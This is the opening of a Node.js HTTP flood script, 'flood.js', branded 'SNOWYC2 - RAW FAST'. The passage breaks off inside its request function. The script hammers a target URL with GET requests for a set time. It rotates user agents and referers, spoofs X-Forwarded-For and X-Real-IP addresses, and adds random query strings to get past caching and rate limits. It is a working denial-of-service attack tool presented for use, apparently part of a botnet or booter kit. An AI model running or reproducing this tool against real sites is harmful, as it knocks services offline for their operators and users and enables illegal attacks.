const http = require('http');
const https = require('https');
const fs = require('fs');
const { URL } = require('url');

const target = process.argv[2];
const duration = parseInt(process.argv[3] || '60');

if (!target) {
    console.log('Usage: node flood.js <url> <seconds>');
    process.exit(1);
}

const USER_AGENTS = readLines('ua.txt');
const REFERERS = readLines('refs.txt');

function readLines(file) {
    try {
        return fs.readFileSync(file, 'utf-8').split('\n').filter(Boolean);
    } catch {
        return ['https://google.com'];
    }
}

const u = new URL(target);
const client = u.protocol === 'https:' ? https : http;

const rand = arr => arr[Math.floor(Math.random() * arr.length)];
const randIP = () => Array(4).fill().map(() => ~~(Math.random() * 255)).join('.');
const randPath = () => u.pathname + `?id=${Math.random().toString(36).slice(2)}`;

let total = 0, success = 0, failed = 0, peak = 0, last = 0;
let running = true;

console.log(`\n  SNOWYC2 - RAW FAST`);
console.log(`  ===============================`);
console.log(`  TARGET: ${target}`);
console.log(`  TIME:   ${duration}s`);
console.log(`  ===============================\n`);

setTimeout(() => running = false, duration * 1000);

setInterval(() => {
    const rps = total - last;
    last = total;
    peak = Math.max(peak, rps);
    process.stdout.write(`\rSENT: ${total} | OK: ${success} | ERR: ${failed} | RPS: ${rps}`);
}, 1000);

function fire() {
    if (!running) return;

    const options = {
        hostname: u.hostname,
        port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: randPath(),
        method: 'GET',
        headers: {
            'User-Agent': rand(USER_AGENTS),
            'Referer': rand(REFERERS),
            'X-Forwarded-For': randIP(),
            'X-Real-IP': randIP(),
            'Connection': 'keep-alive',
            'Accept': '*/*'
        },
        agent: false
    };

    const req = client.request(options, res => {
